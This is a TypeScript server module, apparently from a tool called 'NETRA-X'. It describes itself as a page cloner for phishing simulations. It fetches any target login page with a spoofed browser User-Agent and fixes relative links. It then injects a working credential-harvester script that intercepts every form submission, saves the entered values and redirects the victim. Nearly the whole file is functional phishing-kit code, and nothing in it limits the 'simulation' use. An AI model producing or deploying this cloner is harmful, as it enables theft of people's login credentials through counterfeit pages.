
'use server';
/**
 * @fileOverview A server-side utility for cloning a web page for phishing simulations.
 *
 * - cloneLoginPage - Fetches a URL's HTML, injects a credential harvester script, and returns the modified content.
 * - PageClonerInput - The input type for the cloneLoginPage function.
 * - PageClonerOutput - The return type for the cloneLoginPage function.
 */

import {z} from 'zod';

const PageClonerInputSchema = z.object({
  targetUrl: z.string().url('A valid target URL is required.'),
  redirectUrl: z.string().url('A valid URL to redirect to after submission is required.'),
});
export type PageClonerInput = z.infer<typeof PageClonerInputSchema>;

const PageClonerOutputSchema = z.object({
  htmlContent: z.string().describe('The full HTML content of the generated login page.'),
});
export type PageClonerOutput = z.infer<typeof PageClonerOutputSchema>;


const getHarvesterScript = (redirectUrl: string) => `
<script>
    // This is the main function that captures form data.
    function captureAndRedirect(form) {
        try {
            const formData = new FormData(form);
            const credentials = {};
            let capturedData = false;
            
            for (let [key, value] of formData.entries()) {
                // We only care about non-empty, string-based values.
                if (typeof value === 'string' && value.length > 0) {
                    credentials[key] = value;
                    capturedData = true;
                }
            }
            
            if (capturedData) {
                const entry = {
                    ...credentials,
                    source: window.location.href,
                    timestamp: new Date().toISOString()
                };
                const storageKey = 'netra-captured-credentials';

                const existingData = JSON.parse(localStorage.getItem(storageKey) || '[]');
                const updatedData = [...existingData, entry];
                localStorage.setItem(storageKey, JSON.stringify(updatedData));
            }
        } catch (e) {
            console.error('NETRA-X Harvester: Error saving credentials to localStorage.', e);
        } finally {
            // Always redirect the user to the intended page.
            // Use a small delay to ensure localStorage has time to save.
            setTimeout(() => {
                window.location.href = '${redirectUrl}';
            }, 150);
        }
    }

    // Attach a submit listener to all forms on the page using event capturing.
    // This ensures our listener runs before any other scripts can stop the event.
    document.addEventListener('submit', function(e) {
        // Prevent the form from actually submitting to its original destination.
        e.preventDefault();
        e.stopPropagation();
        
        // Call our capture function with the submitted form.
        captureAndRedirect(e.target);
    }, true);
</script>
`;


export async function cloneLoginPage(input: PageClonerInput): Promise<PageClonerOutput> {
  const { targetUrl, redirectUrl } = PageClonerInputSchema.parse(input);

  try {
    const response = await fetch(targetUrl, {
      headers: {
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36',
        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
        'Accept-Language': 'en-US,en;q=0.9',
      },
    });

    if (!response.ok) {
      throw new Error(`Failed to fetch the target URL. Status: ${response.status}`);
    }

    let html = await response.text();

    // 1. Inject <base> tag to fix relative links for CSS, images, etc.
    const url = new URL(targetUrl);
    const baseTag = `<base href="${url.origin}">`;
    
    if (html.includes('<head>')) {
        html = html.replace(/(<head>)/, `$1${baseTag}`);
    } else {
        html = baseTag + html;
    }


    // 2. Inject the credential harvester script before the closing body tag
    const script = getHarvesterScript(redirectUrl);
    if (html.includes('</body>')) {
      html = html.replace(/<\/body>/, `${script}</body>`);
    } else {
      html = html + script;
    }


    return {
      htmlContent: html,
    };
  } catch (error) {
    console.error('Error cloning page:', error);
    if (error instanceof Error) {
        throw new Error(`Failed to clone page: ${error.message}`);
    }
    throw new Error('An unknown error occurred during page cloning.');
  }
}
